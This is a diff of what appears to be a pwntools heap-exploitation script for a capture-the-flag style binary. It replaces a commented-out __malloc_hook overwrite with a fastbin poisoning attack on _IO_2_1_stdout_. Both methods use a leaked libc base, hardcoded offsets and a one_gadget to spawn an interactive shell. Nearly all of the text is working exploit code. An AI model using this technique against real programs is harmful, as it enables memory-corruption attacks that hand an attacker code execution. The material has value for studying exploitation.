@@ -39,14 +39,32 @@ libc_base = av_top - 0x3c4b78
 log.info('libc_base: 0x%x'%libc_base)
 malloc_hook = libc_base+0x3c4b10
 log.info('malloc_hook: 0x%x'%malloc_hook)
+# =========== method 1 : malloc_hook overwrite =============
+# alloc(0x68) #3
+# free(3)
+# payload = p64(0x71)*6+p64(malloc_hook-35)
+# fill(2,0x38,payload) # overflow 2 to overwrite the FD of 3 -> malloc_hook-35
+# alloc(0x68) #3
+# alloc(0x68) #4
+# fill(4,19+8,'a'*19 + p64(libc_base+one_gadget[1]))
+# alloc(0x10)
 
-alloc(0x68) #3
+# ============ method 2: stdout overwrite =============== 
+alloc(0x68)
 free(3)
-payload = p64(0x71)*6+p64(malloc_hook-35)
+IO_2_1_stdout = 0x7ffff7dd2620+157
+payload = p64(0x71)*6+p64(IO_2_1_stdout)
 fill(2,0x38,payload)
 alloc(0x68) #3
 alloc(0x68) #4
-fill(4,19+8,'a'*19 + p64(libc_base+one_gadget[1]))
-alloc(0x10)
+payload2 = p64(0x0)*2
+payload2 += p64(0xffffffff000000)
+
+payload2 += "\x00\x00\x00"
+payload2 += p64(0x0)
+payload2 += p64(libc_base+one_gadget[3])
+payload2 += p64(0x7ffff7dd2620+216-8-0x38)
+fill(4,51,payload2)  # -> call shell if call puts, printf, ...
+
 s.interactive()
 s.close()
